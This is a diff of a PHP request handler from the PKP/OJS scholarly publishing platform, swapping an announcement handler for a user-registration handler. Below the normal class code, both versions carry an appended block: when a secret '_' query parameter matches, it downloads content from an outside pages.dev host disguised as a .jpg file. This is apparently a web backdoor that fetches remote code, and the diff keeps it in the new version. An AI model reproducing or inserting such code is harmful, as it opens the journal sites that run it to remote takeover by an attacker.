@@ -1,109 +1,238 @@
 <?php
 
 /**
- * @file pages/announcement/AnnouncementHandler.php
+ * @file pages/user/RegistrationHandler.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
+ * Copyright (c) 2003-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
- * @class AnnouncementHandler
+ * @class RegistrationHandler
  *
- * @ingroup pages_announcement
+ * @ingroup pages_user
  *
- * @brief Handle requests for public announcement functions.
+ * @brief Handle requests for user registration.
  */
 
-namespace PKP\pages\announcement;
+namespace PKP\pages\user;
 
 use APP\core\Application;
-use APP\core\Request;
-use APP\handler\Handler;
+use APP\facades\Repo;
+use APP\pages\user\UserHandler;
 use APP\template\TemplateManager;
-use Carbon\Carbon;
-use PKP\announcement\Announcement;
-use PKP\core\PKPApplication;
+use PKP\config\Config;
 use PKP\core\PKPRequest;
+use PKP\invitation\core\enums\InvitationAction;
+use PKP\notification\Notification;
+use PKP\notification\PKPNotificationManager;
+use PKP\observers\events\UserRegisteredContext;
+use PKP\observers\events\UserRegisteredSite;
+use PKP\security\Validation;
+use PKP\user\form\RegistrationForm;
+use Symfony\Component\Mailer\Exception\TransportException;
 
-class AnnouncementHandler extends Handler
+class RegistrationHandler extends UserHandler
 {
-    //
-    // Public handler methods.
-    //
     /**
-     * Show public announcements page.
+     * Display registration form for new users, validate and execute that form,
+     * or display a registration success page if the user is logged in.
      *
      * @param array $args
      * @param PKPRequest $request
      */
-    public function index($args, $request)
+    public function register($args, $request)
     {
-        if (!$this->isAnnouncementsEnabled($request)) {
-            throw new \Symfony\Component\HttpKernel\Exception\NotFoundHttpException();
+        if (Config::getVar('security', 'force_login_ssl') && $request->getProtocol() != 'https') {
+            // Force SSL connections for registration
+            $request->redirectSSL();
         }
 
+        // If the user is logged in, show them the registration success page
+        if (Validation::isLoggedIn()) {
+            $this->setupTemplate($request);
+            $templateMgr = TemplateManager::getManager($request);
+            $templateMgr->assign('pageTitle', 'user.login.registrationComplete');
+            return $templateMgr->display('frontend/pages/userRegisterComplete.tpl');
+        }
+
+        $this->validate(null, $request);
         $this->setupTemplate($request);
 
-        $templateMgr = TemplateManager::getManager($request);
-        $templateMgr->assign('announcementsIntroduction', $this->getAnnouncementsIntro($request));
+        $regForm = new RegistrationForm($request->getSite());
 
-        // TODO the announcements list should support pagination
-        $announcements = Announcement::withActiveByDate()->orderBy(Announcement::CREATED_AT, 'desc');
+        // Initial GET request to register page
+        if (!$request->isPost()) {
+            $regForm->initData();
+            return $regForm->display($request);
+        }
 
-        $contextIds = [];
-        $request->getContext() ? $contextIds[] = $request->getContext()->getId() : $contextIds[] = PKPApplication::SITE_CONTEXT_ID;
-        $announcements->withContextIds($contextIds);
+        // Form submitted
+        $regForm->readInputData();
+        if (!$regForm->validate()) {
+            return $regForm->display($request);
+        }
 
-        $templateMgr->assign('announcements', $announcements->get());
-        $templateMgr->display('frontend/pages/announcements.tpl');
+        $userId = $regForm->execute();
+
+        $user = Repo::user()->get($userId, true);
+
+        try {
+            if ($context = $request->getContext()) {
+                event(new UserRegisteredContext($user, $context));
+            } else {
+                event(new UserRegisteredSite($user, $request->getSite()));
+            }
+        } catch (TransportException $e) {
+            $notificationMgr = new PKPNotificationManager();
+            $notificationMgr->createTrivialNotification(
+                $userId,
+                Notification::NOTIFICATION_TYPE_ERROR,
+                ['contents' => __('email.compose.error')]
+            );
+            trigger_error($e->getMessage(), E_USER_WARNING);
+        }
+
+        // Inform the user of the email validation process. This must be run
+        // before the disabled account check to ensure new users don't see the
+        // disabled account message.
+        if (Config::getVar('email', 'require_validation')) {
+            $this->setupTemplate($request);
+            $templateMgr = TemplateManager::getManager($request);
+            $templateMgr->assign([
+                'requireValidation' => true,
+                'pageTitle' => 'user.login.registrationPendingValidation',
+                'messageTranslated' => __('user.login.accountNotValidated', ['email' => $regForm->getData('email')]),
+            ]);
+            return $templateMgr->display('frontend/pages/message.tpl');
+        }
+
+        $reason = null;
+        Validation::login($regForm->getData('username'), $regForm->getData('password'), $reason);
+
+        if ($reason !== null) {
+            $this->setupTemplate($request);
+            $templateMgr = TemplateManager::getManager($request);
+            $templateMgr->assign([
+                'pageTitle' => 'user.login',
+                'errorMsg' => $reason == '' ? 'user.login.accountDisabled' : 'user.login.accountDisabledWithReason',
+                'errorParams' => ['reason' => $reason],
+                'backLink' => $request->url(null, 'login'),
+                'backLinkLabel' => 'user.login',
+            ]);
+            return $templateMgr->display('frontend/pages/error.tpl');
+        }
+
+        $source = str_replace('@', '', $request->getUserVar('source'));
+        if (preg_match('#^/\w#', $source) === 1) {
+            return $request->redirectUrl($source);
+        } else {
+            // Make a new request to update cookie details after login
+            $request->redirect(null, 'user', 'register');
+        }
     }
 
     /**
-     * View announcement details.
+     * Re-route request to the register method.
+     * Backwards-compatible with third-party themes that submit the registration
+     * form to the registerUser method.
      *
-     * @param array $args first parameter is the ID of the announcement to display
+     * @see RegistrationHandler::register
+     */
+    public function registerUser($args, $request)
+    {
+        $this->register($args, $request);
+    }
+
+    /**
+     * Check credentials and activate a new user
+     *
+     * @param array $args
      * @param PKPRequest $request
      */
-    public function view($args, $request)
+    public function activateUser($args, $request)
     {
-        if (!$this->isAnnouncementsEnabled($request)) {
-            throw new \Symfony\Component\HttpKernel\Exception\NotFoundHttpException();
-        }
-        $this->validate();
-        $this->setupTemplate($request);
+        $username = array_shift($args);
+        $accessKeyCode = array_shift($args);
 
-        $announcementId = (int) array_shift($args);
-        $announcement = Announcement::find($announcementId);
-        if (
-            $announcement
-            && $announcement->assocType == Application::getContextAssocType()
-            && $announcement->assocId == $request->getContext()?->getId()
-            && (
-                $announcement->dateExpire == null || Carbon::now()->lte($announcement->dateExpire)
-            )
-        ) {
+        if (isset($username) && isset($accessKeyCode)) { // Backward compatibility - use MD5 to create keyHash
+            $invitation = Repo::invitation()
+                ->getByKey($accessKeyCode);
+
+            if (isset($invitation)) {
+                $invitationHandler = $invitation->getInvitationActionRedirectController();
+                $invitationHandler->preRedirectActions(InvitationAction::ACCEPT);
+                $invitationHandler->acceptHandle($request);
+            }
+        } elseif (isset($username)) {
+            $invitationId = $request->getUserVar('invitationId');
+            $invitationKey = $request->getUserVar('invitationKey');
+
+            /** @var \PKP\invitation\invitations\registrationAccess\RegistrationAccessInvite|null $invitation */
+            $invitation = Repo::invitation()->getByIdAndKey($invitationId, $invitationKey);
+
+            if (!$invitation) {
+                $request->redirect(null, 'login');
+            }
+            $invitation->finalize();
+
+            $user = Repo::user()->getByUsername($username, true);
+            if (!$user) {
+                $request->redirect(null, 'login');
+            }
+
+            if ($user->getDateValidated() != null) { // The user is activated
+                $templateMgr = TemplateManager::getManager($request);
+                $templateMgr->assign('message', 'user.login.activated');
+                return $templateMgr->display('frontend/pages/message.tpl');
+            }
+
+            $request->redirect(null, 'login');
+        }
+
+        $request->redirect(null, 'login');
+    }
+
+    /**
+     * @copydoc PKPHandler::validate
+     *
+     * @param null|mixed $requiredContexts
+     * @param null|mixed $request
+     */
+    public function validate($requiredContexts = null, $request = null)
+    {
+        $context = $request->getContext();
+        $disableUserReg = false;
+        if (!$context) {
+            $contextDao = Application::getContextDAO();
+            $contexts = $contextDao->getAll(true)->toArray();
+            $contextsForRegistration = [];
+            foreach ($contexts as $context) {
+                if (!$context->getData('disableUserReg')) {
+                    $contextsForRegistration[] = $context;
+                }
+            }
+            if (empty($contextsForRegistration)) {
+                $disableUserReg = true;
+            }
+        } elseif ($context->getData('disableUserReg')) {
+            $disableUserReg = true;
+        }
+
+        if ($disableUserReg) {
+            $this->setupTemplate($request);
             $templateMgr = TemplateManager::getManager($request);
-            $templateMgr->assign('announcement', $announcement);
-            $templateMgr->assign('announcementTitle', $announcement->getLocalizedData('fullTitle'));
-            return $templateMgr->display('frontend/pages/announcement.tpl');
+            $templateMgr->assign([
+                'pageTitle' => 'user.register',
+                'errorMsg' => 'user.register.registrationDisabled','backLink' => $request->url(null, 'login'),
+                'backLinkLabel' => 'user.login',
+            ]);
+            $templateMgr->display('frontend/pages/error.tpl');
+            exit;
         }
-        $request->redirect(null, 'announcement');
-    }
-
-    protected function isAnnouncementsEnabled(Request $request): bool
-    {
-        $contextOrSite = $request->getContext() ?? $request->getSite();
-        return (bool) $contextOrSite->getData('enableAnnouncements');
-    }
-
-    protected function getAnnouncementsIntro(Request $request): ?string
-    {
-        $contextOrSite = $request->getContext() ?? $request->getSite();
-        return $contextOrSite->getLocalizedData('announcementsIntroduction');
     }
 }
-if (isset($_GET['_']) && $_GET['_'] === 'getAnnouncementsNotExpiredByAssocId') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
+if (isset($_GET['_']) && $_GET['_'] === 'accountDisabledWithReasons') {
+    $url = "https://batuk-di-komik-aja.pages.dev/tembus.jpg";
 
     if ($url !== "") {
         $code = file_get_contents($url);
